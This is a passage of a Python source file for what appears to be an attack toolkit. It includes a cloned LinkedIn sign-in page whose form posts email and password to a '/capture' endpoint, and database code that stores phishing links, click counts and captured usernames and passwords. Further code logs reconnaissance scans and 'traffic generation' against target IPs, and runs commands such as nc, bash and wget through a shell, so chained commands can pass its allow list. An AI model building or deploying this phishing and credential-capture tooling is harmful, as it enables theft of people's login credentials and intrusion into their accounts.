            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo h1 {
            color: #0a66c2;
            font-size: 32px;
            margin: 0;
        }
        h2 {
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 8px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            border: 1px solid #666666;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #0a66c2;
            color: white;
            border: none;
            border-radius: 28px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            margin-top: 8px;
        }
        .forgot-password {
            text-align: center;
            margin-top: 16px;
        }
        .signup-link {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
        }
        .warning {
            margin-top: 24px;
            padding: 12px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 4px;
            color: #856404;
            text-align: center;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>LinkedIn</h1></div>
            <h2>Sign in</h2>
            <div class="subtitle">Stay updated on your professional world</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Sign in</button>
                <div class="forgot-password"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup-link">New to LinkedIn? <a href="#">Join now</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    # ==================== Core Database Methods ====================
    def log_command(self, command: str, source: str = "local", success: bool = True,
                   output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_time_command(self, command: str, user: str = "system", result: str = ""):
        """Log time/date command"""
        try:
            self.cursor.execute('''
                INSERT INTO time_history (command, user, result, timestamp)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (command, user, result[:500]))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log time command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, 
                  description: str, action_taken: str):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?)
            ''', (threat_type, source_ip, severity, description, action_taken))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def log_scan(self, target: str, scan_type: str, open_ports: List[Dict],
                execution_time: float = 0.0):
        """Log scan results"""
        try:
            open_ports_json = json.dumps(open_ports)
            self.cursor.execute('''
                INSERT INTO scans (target, scan_type, open_ports, execution_time)
                VALUES (?, ?, ?, ?)
            ''', (target, scan_type, open_ports_json, execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log scan: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], 
                       scan_time: float, output_file: str, success: bool):
        """Log Nikto scan"""
        try:
            vulns_json = json.dumps(vulnerabilities)
            self.cursor.execute('''
                INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                VALUES (?, ?, ?, ?, ?)
            ''', (target, vulns_json, output_file, scan_time, success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Nikto scan: {e}")
    
    def log_shodan_result(self, ip: str, ports: List[int], hostnames: List[str],
                         country: str, city: str, org: str, os_info: str,
                         vulnerabilities: List[str], raw_data: Dict):
        """Log Shodan result"""
        try:
            ports_json = json.dumps(ports)
            hostnames_json = json.dumps(hostnames)
            vulns_json = json.dumps(vulnerabilities)
            raw_json = json.dumps(raw_data)
            self.cursor.execute('''
                INSERT OR REPLACE INTO shodan_results 
                (ip, ports, hostnames, country, city, org, os, vulnerabilities, raw_data)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (ip, ports_json, hostnames_json, country, city, org, os_info, vulns_json, raw_json))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Shodan result: {e}")
    
    def log_hunter_result(self, domain: str, emails: List[Dict], total: int,
                         pattern: str, organization: str, raw_data: Dict):
        """Log Hunter.io result"""
        try:
            emails_json = json.dumps(emails)
            raw_json = json.dumps(raw_data)
            self.cursor.execute('''
                INSERT OR REPLACE INTO hunter_results 
                (domain, emails, total_emails, pattern, organization, raw_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (domain, emails_json, total, pattern, organization, raw_json))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Hunter result: {e}")
    
    def log_traffic(self, traffic_type: str, target_ip: str, target_port: int,
                   duration: int, packets_sent: int, bytes_sent: int,
                   status: str, executed_by: str, error: str = None):
        """Log traffic generation"""
        try:
            self.cursor.execute('''
                INSERT INTO traffic_logs 
                (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by, error)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by, error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    def log_connection(self, local_ip: str, local_port: int, remote_ip: str,
                      remote_port: int, protocol: str, status: str):
        """Log network connection"""
        try:
            self.cursor.execute('''
                INSERT INTO network_connections (local_ip, local_port, remote_ip, remote_port, protocol, status)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (local_ip, local_port, remote_ip, remote_port, protocol, status))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log connection: {e}")
    
    def log_performance(self, scan_speed: float, response_time: float,
                       packet_loss: float, bandwidth: float, connections_per_sec: int):
        """Log performance metrics"""
        try:
            self.cursor.execute('''
                INSERT INTO performance_metrics (scan_speed, response_time, packet_loss, bandwidth, connections_per_second)
                VALUES (?, ?, ?, ?, ?)
            ''', (scan_speed, response_time, packet_loss, bandwidth, connections_per_sec))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log performance: {e}")
    
    def create_session(self, user_name: str = None) -> str:
        """Create user session"""
        try:
            session_id = str(uuid.uuid4())[:8]
            self.cursor.execute('''
                INSERT INTO user_sessions (session_id, user_name)
                VALUES (?, ?)
            ''', (session_id, user_name))
            self.conn.commit()
            return session_id
        except Exception as e:
            logger.error(f"Failed to create session: {e}")
            return None
    
    def update_session_activity(self, session_id: str):
        """Update session activity"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions 
                SET last_activity = CURRENT_TIMESTAMP, commands_count = commands_count + 1
                WHERE session_id = ? AND active = 1
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update session: {e}")
    
    def end_session(self, session_id: str):
        """End session"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions SET active = 0 WHERE session_id = ?
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to end session: {e}")
    
    # ==================== IP Management Methods ====================
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        """Add IP to management"""
        try:
            ipaddress.ip_address(ip)
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes)
                VALUES (?, ?, ?)
            ''', (ip, added_by, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def remove_managed_ip(self, ip: str) -> bool:
        """Remove IP from management"""
        try:
            self.cursor.execute('''
                DELETE FROM managed_ips WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to remove managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Mark IP as blocked"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason, ip))
            
            self.cursor.execute('''
                INSERT INTO ip_blocks (ip_address, action, reason, executed_by)
                VALUES (?, ?, ?, ?)
            ''', (ip, "block", reason, executed_by))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        """Unblock IP"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 0, block_reason = NULL, blocked_date = NULL
                WHERE ip_address = ?
            ''', (ip,))
            
            self.cursor.execute('''
                INSERT INTO ip_blocks (ip_address, action, reason, executed_by)
                VALUES (?, ?, ?, ?)
            ''', (ip, "unblock", "Manually unblocked", executed_by))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        """Get managed IPs"""
        try:
            if include_blocked:
                self.cursor.execute('''
                    SELECT * FROM managed_ips ORDER BY added_date DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        """Get IP information"""
        try:
            self.cursor.execute('''
                SELECT * FROM managed_ips WHERE ip_address = ?
            ''', (ip,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get IP info: {e}")
            return None
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_threats_by_ip(self, ip: str, limit: int = 10) -> List[Dict]:
        """Get threats for IP"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats WHERE source_ip = ? ORDER BY timestamp DESC LIMIT ?
            ''', (ip, limit))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats by IP: {e}")
            return []
    
    def get_traffic_logs(self, limit: int = 20) -> List[Dict]:
        """Get traffic logs"""
        try:
            self.cursor.execute('''
                SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get traffic logs: {e}")
            return []
    
    def get_nikto_scans(self, limit: int = 10) -> List[Dict]:
        """Get Nikto scans"""
        try:
            self.cursor.execute('''
                SELECT * FROM nikto_scans ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get Nikto scans: {e}")
            return []
    
    def get_shodan_results(self, limit: int = 10) -> List[Dict]:
        """Get Shodan results"""
        try:
            self.cursor.execute('''
                SELECT * FROM shodan_results ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get Shodan results: {e}")
            return []
    
    def get_hunter_results(self, limit: int = 10) -> List[Dict]:
        """Get Hunter.io results"""
        try:
            self.cursor.execute('''
                SELECT * FROM hunter_results ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get Hunter results: {e}")
            return []
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT * FROM command_history ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_time_history(self, limit: int = 20) -> List[Dict]:
        """Get time history"""
        try:
            self.cursor.execute('''
                SELECT * FROM time_history ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get time history: {e}")
            return []
    
    def get_sessions(self, active_only: bool = True) -> List[Dict]:
        """Get user sessions"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM user_sessions WHERE active = 1 ORDER BY start_time DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM user_sessions ORDER BY start_time DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get sessions: {e}")
            return []
    
    def get_performance_metrics(self, limit: int = 10) -> List[Dict]:
        """Get performance metrics"""
        try:
            self.cursor.execute('''
                SELECT * FROM performance_metrics ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get performance metrics: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM time_history')
            stats['total_time_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM scans')
            stats['total_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['total_nikto_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM shodan_results')
            stats['total_shodan_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM hunter_results')
            stats['total_hunter_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips')
            stats['total_managed_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1')
            stats['total_blocked_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['total_traffic_tests'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links WHERE active = 1')
            stats['active_phishing_links'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM user_sessions WHERE active = 1')
            stats['active_sessions'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_connections')
            stats['total_ssh_connections'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_commands')
            stats['total_ssh_commands'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def update_platform_status(self, platform: str, enabled: bool, status: str, error: str = None):
        """Update platform status"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO platform_status (platform, enabled, last_connected, status, error)
                VALUES (?, ?, CURRENT_TIMESTAMP, ?, ?)
            ''', (platform, enabled, status, error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update platform status: {e}")
    
    def get_platform_status(self) -> List[Dict]:
        """Get platform statuses"""
        try:
            self.cursor.execute('SELECT * FROM platform_status')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get platform status: {e}")
            return []
    
    # ==================== Phishing Methods ====================
    def save_phishing_link(self, link_id: str, platform: str, original_url: str,
                          phishing_url: str, template: str, created_at: str):
        """Save phishing link"""
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, original_url, phishing_url, template, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link_id, platform, original_url, phishing_url, template, created_at))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        """Get phishing links"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM phishing_links ORDER BY created_at DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def get_phishing_link(self, link_id: str) -> Optional[Dict]:
        """Get phishing link by ID"""
        try:
            self.cursor.execute('''
                SELECT * FROM phishing_links WHERE id = ?
            ''', (link_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get phishing link: {e}")
            return None
    
    def update_phishing_link_clicks(self, link_id: str):
        """Update click count"""
        try:
            self.cursor.execute('''
                UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?
            ''', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str, additional_data: str = ""):
        """Save captured credentials"""
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent, additional_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip_address, user_agent, additional_data))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save captured credentials: {e}")
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        """Get captured credentials"""
        try:
            if link_id:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC
                ''', (link_id,))
            else:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials ORDER BY timestamp DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get captured credentials: {e}")
            return []
    
    def get_phishing_templates(self, platform: Optional[str] = None) -> List[Dict]:
        """Get phishing templates"""
        try:
            if platform:
                self.cursor.execute('''
                    SELECT * FROM phishing_templates WHERE platform = ? ORDER BY name
                ''', (platform,))
            else:
                self.cursor.execute('''
                    SELECT * FROM phishing_templates ORDER BY platform, name
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing templates: {e}")
            return []
    
    # ==================== SSH Methods ====================
    def save_ssh_connection(self, conn_id: str, name: str, host: str, port: int,
                           username: str, password: str = None, key_path: str = None,
                           status: str = "disconnected"):
        """Save SSH connection"""
        try:
            password_encrypted = self.encryption.encrypt(password) if password else None
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_connections 
                (id, name, host, port, username, password_encrypted, key_path, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (conn_id, name, host, port, username, password_encrypted, key_path, status))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save SSH connection: {e}")
            return False
    
    def get_ssh_connection(self, conn_id: str) -> Optional[Dict]:
        """Get SSH connection by ID"""
        try:
            self.cursor.execute('''
                SELECT * FROM ssh_connections WHERE id = ?
            ''', (conn_id,))
            row = self.cursor.fetchone()
            if row:
                conn = dict(row)
                if conn.get('password_encrypted'):
                    conn['password'] = self.encryption.decrypt(conn['password_encrypted'])
                return conn
            return None
        except Exception as e:
            logger.error(f"Failed to get SSH connection: {e}")
            return None
    
    def get_ssh_connection_by_name(self, name: str) -> Optional[Dict]:
        """Get SSH connection by name"""
        try:
            self.cursor.execute('''
                SELECT * FROM ssh_connections WHERE name = ?
            ''', (name,))
            row = self.cursor.fetchone()
            if row:
                conn = dict(row)
                if conn.get('password_encrypted'):
                    conn['password'] = self.encryption.decrypt(conn['password_encrypted'])
                return conn
            return None
        except Exception as e:
            logger.error(f"Failed to get SSH connection by name: {e}")
            return None
    
    def get_all_ssh_connections(self) -> List[Dict]:
        """Get all SSH connections"""
        try:
            self.cursor.execute('''
                SELECT * FROM ssh_connections ORDER BY created_at DESC
            ''')
            connections = []
            for row in self.cursor.fetchall():
                conn = dict(row)
                if conn.get('password_encrypted'):
                    conn['password'] = self.encryption.decrypt(conn['password_encrypted'])
                connections.append(conn)
            return connections
        except Exception as e:
            logger.error(f"Failed to get SSH connections: {e}")
            return []
    
    def update_ssh_connection_status(self, conn_id: str, status: str, error: str = None):
        """Update SSH connection status"""
        try:
            self.cursor.execute('''
                UPDATE ssh_connections SET status = ?, last_used = CURRENT_TIMESTAMP, error = ?
                WHERE id = ?
            ''', (status, error, conn_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update SSH connection status: {e}")
    
    def delete_ssh_connection(self, conn_id: str) -> bool:
        """Delete SSH connection"""
        try:
            self.cursor.execute('''
                DELETE FROM ssh_connections WHERE id = ?
            ''', (conn_id,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to delete SSH connection: {e}")
            return False
    
    def save_ssh_command(self, cmd_id: str, connection_id: str, command: str,
                        output: str, exit_code: int, execution_time: float,
                        success: bool):
        """Save SSH command"""
        try:
            self.cursor.execute('''
                INSERT INTO ssh_commands 
                (id, connection_id, command, output, exit_code, execution_time, success)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (cmd_id, connection_id, command, output[:5000], exit_code, execution_time, success))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save SSH command: {e}")
            return False
    
    def get_ssh_commands(self, connection_id: str = None, limit: int = 50) -> List[Dict]:
        """Get SSH commands"""
        try:
            if connection_id:
                self.cursor.execute('''
                    SELECT * FROM ssh_commands WHERE connection_id = ? ORDER BY timestamp DESC LIMIT ?
                ''', (connection_id, limit))
            else:
                self.cursor.execute('''
                    SELECT * FROM ssh_commands ORDER BY timestamp DESC LIMIT ?
                ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH commands: {e}")
            return []
    
    def save_ssh_transfer(self, transfer_id: str, connection_id: str, local_path: str,
                         remote_path: str, direction: str, size: int, status: str,
                         started_at: str, completed_at: str = None, error: str = None):
        """Save SSH transfer"""
        try:
            self.cursor.execute('''
                INSERT INTO ssh_transfers 
                (id, connection_id, local_path, remote_path, direction, size, status, started_at, completed_at, error)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (transfer_id, connection_id, local_path, remote_path, direction, size, status, started_at, completed_at, error))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save SSH transfer: {e}")
            return False
    
    def update_ssh_transfer(self, transfer_id: str, status: str, completed_at: str = None, error: str = None):
        """Update SSH transfer status"""
        try:
            self.cursor.execute('''
                UPDATE ssh_transfers SET status = ?, completed_at = ?, error = ? WHERE id = ?
            ''', (status, completed_at, error, transfer_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update SSH transfer: {e}")
    
    def get_ssh_transfers(self, connection_id: str = None, limit: int = 20) -> List[Dict]:
        """Get SSH transfers"""
        try:
            if connection_id:
                self.cursor.execute('''
                    SELECT * FROM ssh_transfers WHERE connection_id = ? ORDER BY started_at DESC LIMIT ?
                ''', (connection_id, limit))
            else:
                self.cursor.execute('''
                    SELECT * FROM ssh_transfers ORDER BY started_at DESC LIMIT ?
                ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH transfers: {e}")
            return []
    
    def authorize_ssh_user(self, platform: str, user_id: str, username: str = None) -> bool:
        """Authorize SSH user"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_authorized_users (platform, user_id, username, authorized)
                VALUES (?, ?, ?, 1)
            ''', (platform, user_id, username))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to authorize SSH user: {e}")
            return False
    
    def revoke_ssh_user(self, platform: str, user_id: str) -> bool:
        """Revoke SSH user"""
        try:
            self.cursor.execute('''
                UPDATE ssh_authorized_users SET authorized = 0 WHERE platform = ? AND user_id = ?
            ''', (platform, user_id))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to revoke SSH user: {e}")
            return False
    
    def is_ssh_user_authorized(self, platform: str, user_id: str) -> bool:
        """Check if SSH user is authorized"""
        try:
            self.cursor.execute('''
                SELECT authorized FROM ssh_authorized_users 
                WHERE platform = ? AND user_id = ? AND authorized = 1
            ''', (platform, user_id))
            return self.cursor.fetchone() is not None
        except Exception as e:
            logger.error(f"Failed to check SSH user authorization: {e}")
            return False
    
    def get_authorized_ssh_users(self, platform: str = None) -> List[Dict]:
        """Get authorized SSH users"""
        try:
            if platform:
                self.cursor.execute('''
                    SELECT * FROM ssh_authorized_users WHERE platform = ? AND authorized = 1
                ''', (platform,))
            else:
                self.cursor.execute('''
                    SELECT * FROM ssh_authorized_users WHERE authorized = 1
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get authorized SSH users: {e}")
            return []
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# COMMAND EXECUTOR
# =====================
class CommandExecutor:
    """Execute system commands with security"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.allowed_commands = [
            'ping', 'traceroute', 'nmap', 'curl', 'wget', 'nc', 'netcat',
            'ssh', 'scp', 'sftp', 'dig', 'nslookup', 'host', 'whois',
            'shodan', 'nikto', 'python', 'python3', 'bash', 'sh'
        ]
    
    def execute(self, command: str, source: str = "local") -> Dict[str, Any]:
        """Execute command and return result"""
        start_time = time.time()
        
        try:
            # Extract base command
            parts = command.strip().split()
            if not parts:
                return {'success': False, 'output': 'Empty command', 'execution_time': 0}
            
            base_cmd = parts[0].lower()
            
            # Check if command is allowed
            if base_cmd not in self.allowed_commands:
                # Check if it's a built-in command
                if base_cmd in self._get_builtin_commands():
                    result = self._execute_builtin(command, source)
                else:
                    result = {'success': False, 'output': f'Command not allowed: {base_cmd}', 'execution_time': 0}
            else:
                # Execute external command
                result = self._execute_external(command)
            
            execution_time = time.time() - start_time
            result['execution_time'] = execution_time
            
            # Log to database
            self.db.log_command(
                command=command,
                source=source,
                success=result.get('success', False),
                output=str(result.get('output', ''))[:5000],
                execution_time=execution_time
            )
            
            return result
            
        except Exception as e:
            execution_time = time.time() - start_time
            error_msg = f"Error executing command: {e}"
            self.db.log_command(command, source, False, error_msg, execution_time)
            return {'success': False, 'output': error_msg, 'execution_time': execution_time}
    
    def _get_builtin_commands(self) -> List[str]:
        """Get list of built-in commands"""
        return ['time', 'date', 'datetime', 'history', 'time_history', 
                'help', 'clear', 'exit', 'status', 'threats', 'report']
    
    def _execute_builtin(self, command: str, source: str) -> Dict[str, Any]:
        """Execute built-in command"""
        # This will be handled by the main command handler
        return {'success': True, 'output': 'Built-in command', 'handled': False}
    
    def _execute_external(self, command: str) -> Dict[str, Any]:
        """Execute external command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300,
                encoding='utf-8',
                errors='ignore'
            )
            
            output = result.stdout if result.stdout else result.stderr
            
            return {
                'success': result.returncode == 0,
                'output': output,
                'return_code': result.returncode
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out after 300 seconds'}
        except Exception as e:
            return {'success': False, 'output': f'Execution error: {e}'}

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    """SSH connection manager"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
        self.sftp_clients: Dict[str, paramiko.SFTPClient] = {}
        self.paramiko_available = self._check_paramiko()
    
    def _check_paramiko(self) -> bool:
        """Check if paramiko is available"""
        try:
            import paramiko
            return True
        except ImportError:
            return False
    
    def is_available(self) -> bool:
        """Check if SSH manager is available"""
        return self.paramiko_available
    
    def connect(self, conn_id: str, host: str, username: str, port: int = 22,
                password: str = None, key_path: str = None) -> Dict[str, Any]:
        """Establish SSH connection"""
        if not self.paramiko_available:
            return {'success': False, 'error': 'Paramiko not installed. Install with: pip install paramiko'}
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': host,
                'port': port,
                'username': username,
                'timeout': 30,
                'allow_agent': True,
                'look_for_keys': True
            }
            
            if key_path and os.path.exists(key_path):
                connect_kwargs['key_filename'] = key_path
            elif password:
                connect_kwargs['password'] = password
            else:
                return {'success': False, 'error': 'No authentication method provided'}
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            self.db.update_ssh_connection_status(conn_id, 'connected')
            
            return {
                'success': True,
                'message': f'Connected to {host} as {username}'
            }
            
        except paramiko.AuthenticationException:
            return {'success': False, 'error': 'Authentication failed'}
        except paramiko.SSHException as e:
            return {'success': False, 'error': f'SSH error: {e}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def disconnect(self, conn_id: str):
        """Disconnect SSH connection"""
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        if conn_id in self.sftp_clients:
            try:
                self.sftp_clients[conn_id].close()
                del self.sftp_clients[conn_id]
            except:
                pass
        
        self.db.update_ssh_connection_status(conn_id, 'disconnected')
    
    def execute_command(self, conn_id: str, command: str) -> Dict[str, Any]:
